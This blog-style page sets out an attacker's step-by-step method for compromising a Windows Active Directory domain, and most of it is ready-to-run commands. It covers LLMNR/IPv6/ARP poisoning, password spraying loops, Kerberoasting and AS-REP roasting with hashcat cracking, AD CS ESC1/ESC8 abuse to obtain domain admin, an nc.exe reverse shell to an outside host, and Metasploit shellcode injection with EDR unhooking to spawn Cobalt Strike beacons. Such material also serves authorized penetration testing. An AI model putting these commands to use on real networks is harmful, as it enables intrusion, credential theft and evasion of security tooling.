[back](/)

### Active Directory Methodology

![Image](/img/ad_workflow/ad.jpg)

Imagine that you got into the internal circuit of the company, although this is usually the hardest part for a hacker. Let's try to act from the side of an external attacker who knows nothing about the company's internal infrastructure.

So we got access to the inner circuit, first you need to get information about network addressing and listen to the traffic. We do this to identify targets for scanning and moving forward.

To study the network, you can use the wireshark utility, we will find out which devices are working on the network, the names and software versions of routers, hostnames, name resolution protocols to IP addresses such as LLMNR and NBT-NS, service protocols, etc. To complete the picture, we can do:

```
arp -a
route -n
cat /etc/resolv.conf - if the address was assigned by DHCP
```

At a minimum, having gained access to the network, we have DNS addresses, which usually have the same role as the domain controller. So we can do a network scan, for example, it will effectively check open ports: 

```
80,443,22,5432,1433,3306,1080,8080,8081,8888,8088,8086,6379,21,8443,23,25,5555,4444,2222,3333,3000,5000,8000,9000,9050,5050,5900,389,636,445,111,135,139,5060,79,5985,5986,1090,1098,1099,11099,47001,47002,10999,7000-7004,8000-8003,9000-9003,9503,7070,7071,45000,45001,8686,9012,50500,4848,11111,4445,4786,5556,3268
```

At the same time, it will be effective to use MITM attacks, or infection of name resolution protocols in IP addresses.
If the network has LLMNR and NBTNS protocols:

```
responder -I eth0 -b -f -F -w -P --lm
```

If there are DHCP requests to IPv6 on the network, or you see the address assigned to the IPv6 interface:

```
python mitm6.py -d jaki.local
```
or you can try assigning IPv6 addresses yourself:

```
ifconfig eth0 inet6 add fe80::200:f8ff:fe21:67cf/64 
```

You can end up using an **ARP & DNS attack Spoof**, which will always work if there is user traffic in the vlan:

```
./bettercap-iface eth0
net.probe on
set dns.spoof.domains jaki.local
dns.spoof on
arp.spoof on
```

Why are we doing this? What is the purpose of these actions? In order to launch an attack on Active Directory, you need to get initial access to the domain, in other words, any active account.

While our fishing utils are set to MITM attack, it will not be superfluous to look for a mask of account logins. Each company has its own domain account mask, someone uses only last names, someone combines first and last names, someone uses depersonalized accounts, for example, a set of letters or numbers that are not related to the employee in any way, and this approach is considered the most effective in terms of AD privacy protection.

The account mask can be found using document metadata, can be searched on the web using google queries **site:jaki.local filetype:doc / pdf / docx / xlsx**, or use specialized software such as Foca.

It will also be very efficient to go through the file shares - 445/tcp, because we have already performed a network scan after determining the addressing. Then you should look for network shares open for reading:

```
crackmapexec smb --shares /tmp/smb_hosts.txt -u guest -p '' --pass-pol
crackmapexec smb --shares /tmp/smb_hosts.txt -u '' -p ''
```

Also do not forget about NULL sessions on domain controllers:

```
rpcclient -U '%' dc.jaki.local
srvinfo
enumdomusers
getdompwinfo
querydominfo
netshareenum
netshareenumall
enumprinters
```

Go to SMB shares, get information from RPC, use MITM and infect name resolution protocols - figure out the account mask. If, as part of a MITM attack, you received netNTLMv1 with the --lm key for the responder - use [crack.sh](https://crack.sh/get-cracking/) to restore pure NTLM for the user by sending NTHASH:responder_hash. If you got netNTLMv2, the only option is to brute-force:

```
hashcat -a 0 -m 5600 /tmp/hash /usr/share/wordlists/somelist.txt -w 4 -O
```

However, if you notice a missing SSP signature, use mass relay attacks with ntlmrelayx.py. In any case, it is necessary to generate a dictionary for domain logins in order to further attack **Password spray**. You can generate a dictionary using a ready-made list of popular surnames from git or Wikipedia. In any case, you can do the following:

```
while read LINE; do awk -vn=$LINE '{print n$0}' /tmp/last_names.txt; done < /tmp/first_name_letters.txt
```

The easiest way to perform this attack is through a utility for the Kerberos 88/tcp service:

```
./kerbrute_linux_amd64 passwordspray -d jaki.local --dc dc.jaki.local /tmp/users.txt 'somepassword'
```

However, any service that allows authentication is suitable for this attack:

```
**SMB**
crackmapexec smb 10.10.1.1 --shares -u /tmp/domain_users.txt -p 'somepassword'
while read line; do echo $line && smbclient -U JAKI\\$line%NTLM --pw-nt-hash -L 10.10.1.1 -m SMB3; done < /tmp/domain_users.txt > /tmp/log_smb.txt

**LDAP**
for i in $(cat /tmp /domain_users.txt); do ldapwhoami -h 10.10.1.1 -p 389 -D "cn=users,dc=jaki,dc=local" -w $i; done > /tmp/log_ldap.txt

**RPC**
while read line; do echo $line && python3 rpcdump.py scrm.local/$line:somepassword@jaki.local; done < /tmp/domain_users.txt > /tmp/log_smb.txt

**LDAP WEB Auth**
while read LINE; do sleep 1; echo $LINE "=" && curl -o /dev/null -s -w "%{num_headers}\ n" -X POST -d "username=$LINE&password=somepassword&submit=yes" -k https://somewebauth/login.php done < /tmp/domain_users.txt > /tmp/log_smb.txt

**WINRM**
while read line; do echo $line && ruby evil-winrm.rb -u $line -i 10.10.1.1 -H NTLM; done < /tmp/domain_users.txt > /tmp/log_smb.txt

```

or just use modules from **Metasploit Framework**. To use spray and avoid interactive login, generate NTLM:

```
echo -n "password" | iconv -t UTF-16LE | openssl md4
```

Ultimately, you should have an active account in the domain. First of all, you need to get an AD dump and examine user rights, RDP connection permissions, user sessions, server names and GPOs. These can all be obtained with Bloodhound Collectors. But in order not to be noticed by antivirus or EDR, you can use network dump collection via Bloodhound.py:

```
python3 bloodhound.py -c All,LoggedOn -u someuser@jaki.local -d jaki.local
```

here you need to understand that you can be caught by Anomaly Detection Software or NGFW.

If you are on an inside machine without antivirus or EDR you can use the collectors:

```
Sharphound.exe -c All,LoggedOn
```

But it is much more efficient to use your own VM for this procedure, if, say, domain controller services are available from your attacking machine:

```
runas /netonly /U:someuser@jaki.local powershell
dir \\jaki.local\sysvol
powershell -exec bypass
./Sharphound.exe -c All,LoggedOn -d jaki.local
```

If it is possible to use a session from Cobalt Strike, run:

```
execute-assembly /tmp/Sharphound.exe -c All,LoggedOn -d jaki.local
```

At the same time, you have the opportunity to unload service accounts with the attribute SPN - Kerberoasting:

```
python GetUserSPNs.py -hashes :NTLM -request -target-domain jaki.local jaki.local/someuser
```

if ldap/ldaps ports are blocked but gc port 3268 is accessible - just fix ldap:// protocol to gc:// in impacket.
If it is forbidden to use NTLM authorization in the domain, use Kerberos authorization:

```
getTGT.py jaki.local/someuser -hashes :NTLM -dc-ip 10.10.1.1
export KRB5CCNAME=someuser@dc.jaki.local
python3 GetUserSPNs.py jaki.local/ -k -dc-ip dc.jaki.local -debug --request
```

TGS upload formats can be the following:

```
$krb5tgs$23$ - RC4
$krb5tgs$17$ - AES128
$krb5tgs$18$ - AES256
```

The same goes for AS-REP Roasting, this attack checks accounts without the PREAUTH flag:

```
GetADUsers.py jaki.local/someuser:somepassword -k -dc-ip dc.jaki.local -all --debug | cut -d ' ' -f 1 > /tmp/users.txt
python GetNPUsers.py JAKI/ -usersfile /tmp/users.txt -format hashcat -dc-ip 10.10.1.1
```

TGT upload format can be as follows:

```
$krb5asrep$23$ - RC4
$krb5asrep$17$ - AES128
$krb5asrep$18$ - AES256
```

The next stage will be Brute-force. Once you have a service account, you can continue lateral movement in the domain:

```
hashcat -a 0 -m 13100 /tmp/hash /usr/share/wordlists/somelist.txt -w 4 -O
```

To bypass protections such as MS-ATA use **Pass the key** attack:

```
Get-KerberosAESKey -Password somepassword -Salt JAKI.LOCALsomeuser
getTGT.py scrm.local/ksimpson@scrm.local -aesKey 'yourkey'
# and then Kerberos authentication
```

So we have several accounts, a lot of information from AD, how do we move on? First, you need to check those accounts in the Bloodhound database that you already have, carefully study their rights, groups, permissions. If you have cleartext passwords for SPN account - go back to them and try to go to the server specified in TGS using:

```
python wmiexec.py jaki.local/someuser@jaki.local -k -no-pass
# try to read Remote Registry
reg.py -k jaki.local query -keyName HKU -s
```

Don't forget that you have a list of all hosts, as well as their rights and groups in the domain, examine all accounts with local administrator rights on the hosts. There is a corresponding request for Bloodhound:

```
MATCH p=(m:User)-[r:AdminTo]->(n:Computer) RETURN p
```

It will show you all hosts with local administrator rights, on any hosts. Examine these accounts, check if these users are enabled, how long ago the password was assigned? You may be able to perform a **Password Spray attack**, both for administrative accounts and for the actual list from the Bloodhound dump, or request an easier-to-parse format with GetADUsers.py
If the accounts you get are not local administrators on Bloodhound, it might be worth checking this and logging into each server and workstation to make sure:

```
runas /netonly /U:someuser@jaki.local powershell
dir \\jaki.local\sysvol
Import-Module .\PowerView.ps1
Find-LocalAdminAccess -domain jaki.local
```

Don't forget the scripts in the **\\jaki.local\sysvol** folder, very often administrators forget about the security of this directory and leave a lot of useful information in it, even passwords for service accounts.

Use **PingCastle.exe --healthcheck --server jaki.local** to collect detailed information about the domain, you may find logins and passwords in the GPO.

Use the obtained accounts and smb shares to get information about read and write permissions:

```
while read line; do echo $line && smbclient -L $line -U JAKI\\someusername%NTLM --pw-nt-hash -m SMB3; done < /tmp/smb_hosts.txt > /tmp/log_smbshares.txt
```

Of course, you need to understand whether LAPS or GMSA is used in the domain, from this you will conclude whether it is worth brute service accounts or local administrator accounts.

If at the current stage you have not been able to move forward within the lateral movement, try moving to web services and other application protocols to find vulnerabilities that will allow you to gain a foothold in the domain or get additional accounts. Also use the PowerUp.ps1 script on the affected machine.

Don't forget the techniques for getting a domain administrator using [AD CS](https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6). The most common privilege escalation techniques are ESC1 and ESC8.


### Template Enrollment Rights abuse ESC1 - technique understanding:

Client Authentication: True + Extended Key Usage: Client Authentication - cert maybe to be used for authentication

Certificate Name Flag: EnrolleeSuppliesSubject - when issuing a certificate, you can specify any name, including the domain admin

Extended key Usage: Client Authentication - certificate can be used for authentication

Enrollment Rights: Domain Users - you can issue a certificate as a member of the domain users group

**ESC1 workflow:**

```
certipy find someuser:somepassword@dc.jaki.local
certi.py req 'jaki.local/someuser:somepassword@dc.jaki.local 'AD CS Name' -k -n --alt-name admin@jaki.local --template vulnetemplatename
python gettgtpkinit.py jaki.local/admin -cert-pfx admin@jaki.local.pfx -pfx-pass admin admin.ccache -dc-ip 10.10.1.1
export KRB5CCNAM=admin.ccache
```

or just, if NTLM auth enabled

```
certi.py req 'jaki.local/someuser:somepassword@dc.jaki.local 'AD CS Name' -k -n --alt-name admin@jaki.local --template vulnetemplatename
certification auth -pfx admin.pfx   
# and get NTLM admin hash
```

###  NTLM Relay to AD CS HTTP Endpoints ESC8 - technique understanding:

Web Enrollment: Enabled - the ability to issue a certificate through a web request

http:// - use http protocol for AD CS, no additional protection Basic / NTLM auth

**ESC8 workflow:**

```
certipy find someuser:somepassword@dc.jaki.local
certipy relay -ca 10.10.1.2 -debug -template vulntemplate -alt admin@jaki.local
python3 PetitPotam.py attacketip dc.jaki.local --dc-ip 10.10.1.1 --u someuser --p somepassword
# or another way to get netNTLMv1-2 without SSP
```


### Additional tricks:

```
Run process as different Powershell user:
$username = 'someuser'
$password = 'somepassword'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Invoke-Command -ComputerName DC -ScriptBlock { C:\Windows\System32\spool\drivers\color\nc.exe 10.10.1.3 443 -e cmd.exe } -Credential $credential
```

MSF and Cobalt are friend's forever

Spawn BEACON from meterpreter to Сobalt Strike

```
use exploit/windows/local/ payload_inject
set PAYLOAD windows/meterpreter/reverse_http
set LHOST 10.10.16.4
set LPORT 80
set SESSION 9
set DisablePayloadHandler True
exploit -j

Module options (exploit/windows/local/ payload_inject):
Name Current Setting Required Description
---- --------------- -----------------
NEWPROCESS true no New notepad.exe to inject to
PID 1752 no Process Identifier to inject of process to inject payload.
SESSION 2 yes The session to run this module on.
```

Spawn BEACON from meterpreter to cobalt strike v2.
We generate shellcode via Cobalt Strike -> Attacks -> Packages -> Windows Executable (S) -> raw

```
2. msf6 post(windows/manage/shellcode_inject) > show options

Module options (post/windows/manage/shellcode_inject):
Name Current Setting Required Description
---- --------------- -----------------
AUTOUNHOOK false yes Auto remove EDRs hooks
BITS 64 yes Set architecture bits (Accepted: 32, 64)
CHANNELIZED false yes Retrieve output of the process
HIDDEN true yes Spawn an hidden process
INTERACTIVE false yes Interact with the process
PID 0 no Process Identifier of process to inject the shellcode. (0 = new process)
PPID 0 no Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing)
SESSION yes The session to run this module on
SHELLCODE yes Path to the shellcode to execute
WAIT_UNHOOK 5 yes Seconds to wait for unhook to be executed


msf6 post(windows/manage/shellcode_inject) > set SESSION 1
SESSION => 1
msf6 post(windows/manage/shellcode_inject) > set SHELLCODE /tmp/beacon.bin
SHELLCODE = > /tmp/beacon.bin
msf6 post(windows/manage/shellcode_inject) > exploit
[*] Running module against WS05
[*] Spawned Notepad process 7436
[+] Successfully injected payload into process: 7436
[*] Post module execution completed
msf6 post(windows/manage/shellcode_inject) >
```

SMB Pipe injection into parent process (Defender Bypass) Cobalt Strike

```
1. Make SMB Beacon - random name
2. Run payload inside the target host
2. Than inject PID x64 PIPENAME_BEACON
3. And then inject several times with chain into different process (svchost, systemtray, etc) to bypass AV
```


### Impacket bugs mitigation:

If you have error:

```
File "/usr/local/lib/python3.9/dist-packages/impacket/ldap/ldap.py", line 244, in kerberosLogin
raise LDAPSessionError(
impacket.ldap.ldap.LDAPSessionError: Error in bindRequest -> strongerAuthRequired: 00002028: LdapErr: DSID-0C090259
```

than edit your tds.py find both lines defining the ctx: (and all impacket scripts)

```
ctx = SSL.Context(SSL.TLSv1_METHOD)
change it to
ctx = SSL.Context(SSL.TLSv1_2_METHOD)
```

If you have error:

```
File "C:\Python27\Scripts\GetUserSPNs.py", line 116, in getMachineName
raise 'Error while anonymous logging into %s'
```

Change line in GetUsersPNs.py to say this: (and all impacket scripts)

```
target = self.__kdcHost
instead of this:
target = self.getMachineName()
```

Useful links:

+ [Get-KerberosAESKey](https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372)
+ [Cetipy](https://github.com/ly4k/Certipy)
+ [Impacket](https://github.com/SecureAuthCorp/impacket)
+ [BloodHound](https://github.com/BloodHoundAD/BloodHound)

<div id="disqus_thread"></div>
<script>
(function() { // DON'T EDIT BELOW THIS LINE
var d = document, s = d.createElement('script');
s.src = 'https://hackitfaster-hopto-org.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

[back](/)